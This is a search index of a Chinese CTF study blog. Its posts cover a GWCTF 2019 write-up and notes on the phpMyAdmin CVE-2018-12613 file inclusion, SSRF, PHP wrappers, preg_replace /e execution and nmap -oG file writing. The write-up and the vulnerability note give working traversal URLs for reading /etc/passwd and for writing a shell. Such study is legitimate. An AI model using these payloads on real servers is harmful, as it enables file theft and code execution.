[{"title":"Web刷题(二)","url":"/2022/11/22/Web%E5%88%B7%E9%A2%98-%E4%BA%8C/","content":"GWCTF 2019]我有一个数据库自己的想法打开网站，发现只有乱码文字，没有其他的\n\n尝试用burpsuite看一下，也没有什么\n\n然后用工具扫描一下，发现有robots.txt文件，打开查看，有个php文件，访问它，也没有发现啥，继续扫描，发现phpadmin目录！！！\n\n\n访问phpadmin后\n\nemm。。小白不会了\n看的wp发现有个漏洞CVE-2018-12613&amp;PHPmyadmin 4.8.0/4.8.1漏洞\n简单就是说，可以构造url参数，利用include函数实现任意文件读取或者写入（一句话木马等）\n然后构造payload（../../../../../../../是直接跳到根目录里了）\n读取  etc/passwd：http://IP/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../etc/passwd\n读取flag ： http://IP/phpmyadmin/index.php?target=db_datadict.php%253f/../../../../../etc/passwd\n","categories":["Web"],"tags":["PHPmyadmin"]},{"title":"Hello World","url":"/2022/11/21/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"web刷题(一)","url":"/2022/11/22/web%E5%88%B7%E9%A2%98-%E4%B8%80/","content":"ssrf（服务端请求伪造）​\t原因：web网站会从其他的服务器获取信息然后显示到当前网站上，而这个获取信息的url链接是用户自己可控的，且过滤要求不是很严\n​\t危害：可用来获取web服务器本地的一些敏感文件，如使用php伪协议的file:&#x2F;&#x2F;\nIP 伪造​\tX-Foewared-For：用来获取客户端的ip地址—-可自定义伪造\n模块注入​\tjava的spring， python的flask，php的tp \n​\t用户提交的信息被当作代码执行：\n​\t\t其中变量为 {  {  } } 的形式 \nshell命令​\t单引号中的变量( $shell ) 不会 被当作变量执行\n​\t双引号中的变量( $shell ) 会被当做变量执行\n┌──(kali㉿kali)-[~]└─$ echo &quot;\\&lt;&quot;                                                            \\&lt;                                                                                                                                                                                                 ┌──(kali㉿kali)-[~]└─$ echo &#x27;\\&lt;&#x27;\\&lt;                                                                                                                                                                                                 ┌──(kali㉿kali)-[~]└─$ echo \\&lt;  &lt;\t\t\t\t#没有引号的时候，会转义，\n\n\npython的虚拟环境:\n# 创建python -m venv 环境名# 激活source 环境名/bin/sctivate#退出deactivate\n\n\n\n正则表达式​\t循环匹配的—- ( ?R )\n\n​\t ( ?R )\t ：匹配一次   \n ( ?R )+   ：匹配一次或多次  \n\n​\t ( ?R )*    ：匹配0次或多次 \n​\t ( ?R )？   ：匹配0次或1词   \n​\t  \n​\t因为是递归循环匹配的（相当于一直在循环匹配），前两个如果匹配到的话是没有退出条件的（所以匹配不成功），而后两个是由退出条件（即为0次，时），所以可以匹配成功\n​\t例子：\n​\t\ta(b(c()))—–若按第二个匹配来的话，那么最里的括号里应该还有能匹配的\n​\t\t\t\t\t\t\t按第三个来的话，匹配到 ***c()***时，此时没有能匹配的了，匹配次数为0.相当于在此停止匹配了\nphp\n读文件到页面的方法：\n\n​\tphp伪协议：file：//或php：//filte\n\nfile_get_contents()函数\n\n​    使用系统命令，如：system(&quot;ls&quot;)或system(&quot; cat /flag&quot;)\n\n​    使用highlight_file()或show_source()\n\nphp使用session（可用来伪造session信息，从而绕过安全检测！！）\n\n手动启用：session_start() #会自动生成一个session_id值\n自定义session的值：$_session[&#39;key&#39;]\n可使用抓包工具更改session_id的值，然后服务端使用函数读取session_id，以此来绕过一些字符串检测\n\n\n\n\nphp伪协议：\n\n​\t读文件\n\nphp://filter/read=convert.base64-encode/resource= &#39; xxx.php &#39;\n\nfile://&#39; 路径名 &#39;\n\n​    写文件(输入文件流)\n\nphp://filter/write=convert.base64-encode/resource=&#39;  xxx.php &#39; &amp;&amp; txt= &quot;内容&quot;\nphp://filter/resource=&#39;  xxx.php &#39; &amp;&amp; txt= &quot;内容&quot;\nphp://input  ----- 此时使用post传数据流\ndata://text/plain;base64,&quot; 编码内容 “\n\n\n\n\n​    执行命令\n\n\n\nphp的坑：\n\n​\t在后端传参时，有些特殊字符会被默认替换：\n\n\n\n​\t\t     如： .*  =&gt; _*    即传参数时，小数点开头则会被替换为_\n​\t\t 2.    使用变量输出时，单引号中变量不存在，双引号中变量存在\npreg_replace($pattern, $replacement, $subject)函数，其中$pattern的标志有\\e，PHP 5.5.0 起， 传入 “\\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\\e” 也无法起效。\npreg_replace（）函数的漏洞\n​\t匹配成功后，第二个参数会被当作代码执行\n​\t而preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;,&#39;strtolower(&quot;\\\\1&quot;)&#39;,$str）中的\\\\1会被解释为\\1 即为正则匹配到的第一个字符（group(1)）\n​\t漏洞执行过程：\npreg_replace(&#x27;/.*/ei&#x27;,&#x27;strtolower(&quot;\\\\1&quot;)&#x27;,phpinfo()）             相当于是 eval(&#x27;strtolower(&quot;phpinfo()&quot;)&#x27;),此时phpinfo()是一个字符串，不能执行该代码preg_replace(&#x27;/.*/ei&#x27;,&#x27;strtolower(&quot;\\\\1&quot;)&#x27;,$&#123;phpinfo()&#125;)             相当于是 eval(&#x27;strtolower(&quot;$&#123;phpinfo()&#125;&quot;)&#x27;) 此时phpinfo()是一个变量，可以执行改代码，             但是！！！当strtolower()内为单引号时，便不行了！！！！！\n\n\n\nphp的循环遍历：\nforeach($_GET as $key =&gt; $value)&#123;    print($key);    print($value);&#125;\n\n\n\nnmapnamp 的 oG 命令，可以写入文件\nnmap  -sT 192.168.1.0 -oG  123.php\t#把执行过程与结果，写入到文件123.php中nmao &#x27;&#x27;/&lt;/?&#x27;&#x27;\n\n\n\n\n\n","categories":["Web"],"tags":["ssrf","nmap","正则","preg_replace"]},{"title":"漏洞知识记录","url":"/2022/11/22/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E8%AE%B0%E5%BD%95/","content":"CVE-2018-12613&amp;PHPmyadmin 4.8.1漏洞漏洞范围：phpmyadmin 4.8.0以及4.8.1\n漏洞原理：在index.php的第60-63行代码\n##  phpadmin的index.php文件$target_blacklist = array (    &#x27;import.php&#x27;, &#x27;export.php&#x27;);// If we have a valid target, let&#x27;s load that script insteadif (! empty($_REQUEST[&#x27;target&#x27;])    &amp;&amp; is_string($_REQUEST[&#x27;target&#x27;])    &amp;&amp; ! preg_match(&#x27;/^index/&#x27;, $_REQUEST[&#x27;target&#x27;])    &amp;&amp; ! in_array($_REQUEST[&#x27;target&#x27;], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST[&#x27;target&#x27;])) &#123;    include $_REQUEST[&#x27;target&#x27;];    exit;&#125;\n\n当满足5个条件后就会include $_REQUEST[&#39;target&#39;];\n\n$_REQUEST[&#39;target&#39;]不为空\n$_REQUEST[&#39;target&#39;]是字符串\n$_REQUEST[&#39;target&#39;]不以index开头\n$_REQUEST[&#39;target&#39;]不在$target_blacklist中&#39;import.php&#39;, &#39;export.php&#39;\nCore::checkPageValidity($_REQUEST[&#39;target&#39;])为真代码在libraries\\classes\\Core.php 443-476行\n\n问题出现在第 465 行的urldecode() 我们可以利用这个函数绕过白名单检测，只要把?两次url编码为 %253f 即可绕过验证。\npublic static function checkPageValidity(&amp;$page, array $whitelist = [])&#123;    if (empty($whitelist)) &#123;        $whitelist = self::$goto_whitelist;    &#125;    if (! isset($page) || !is_string($page)) &#123;        return false;    &#125;    if (in_array($page, $whitelist)) &#123;        return true;    &#125;    $_page = mb_substr(        $page,        0,        mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)    );    if (in_array($_page, $whitelist)) &#123;        return true;    &#125;    $_page = urldecode($page);    $_page = mb_substr(        $_page,        0,        mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)    );    if (in_array($_page, $whitelist)) &#123;        return true;    &#125;    return false;&#125;## 基本做了三次白名单匹配## 第一次匹配传进来的$page参数## 第二次匹配截取的$_page## 第三次匹配先url解码在截取的$_page## 截取字符方式，mb_strpos函数获取?出现的位置（本意是想新添加?，再获取其在字符最后的位置即为字符长度），然后再用mb_substr函 ## 数获取从位置0开始，$page长的的字符串## 绕过方法## 1. 绕第二个匹配（直接加个?)；可以使用target=db_sql.php%37/../../../../../../etc/passwd## 2. 绕第三个匹配(加一个?的url编码）；也可以用target=db_sql.php%253f/../../../../../../etc/passwd\n\n漏洞利用（第二种绕过方式）：\n\n任意文件读取\n读取etc/passwd：http://IP/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../etc/passwd\n或者：http://IP/phpmyadmin/index.php?target=db_datadict.php%253f/../../../../../etc/passwd\n\n任意代码执行&amp;&amp;写入shell\n查看当前的运行目录：\n\n创建数据库，数据表，字段，写入值\n\n然后包含该文件：http://IP/phpmyadmin/index.php?target=db_sql.php%253f/../../../mysql/data/cve/cve.MYD，即可访问phpinfo\n\n\n","categories":["Web"],"tags":["PHPmyadmin","php"]}]